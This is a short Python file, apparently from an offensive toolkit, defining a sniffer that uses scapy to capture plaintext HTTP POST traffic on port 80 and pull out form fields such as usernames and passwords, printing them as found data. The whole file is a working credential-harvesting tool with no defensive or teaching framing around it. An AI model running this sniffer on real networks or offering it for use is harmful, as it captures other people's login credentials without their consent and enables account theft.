import sys, socket, paramiko, getpass, re, dns.resolver, requests
from scapy.all import *
def sniffer():
    try:

        def cb_sniff(pkt):

            header = str(pkt[TCP].payload)[2:6]
            if header == 'POST':
                uspas = re.findall(r'\w+=\w+&\w+=\w+', str(pkt.payload))

                print('[!] DATA FOUND::')
                print(str(uspas)[1:-1] + '\n\n')

        print('[#] Sniffing...\n\n')
        sniff(filter='port 80', store=False, prn=cb_sniff)

    except Exception as error:
        if '[Errno 1] Operation not permitted' in str(error):
            print('Privileges Error \nTry run with "sudo"')
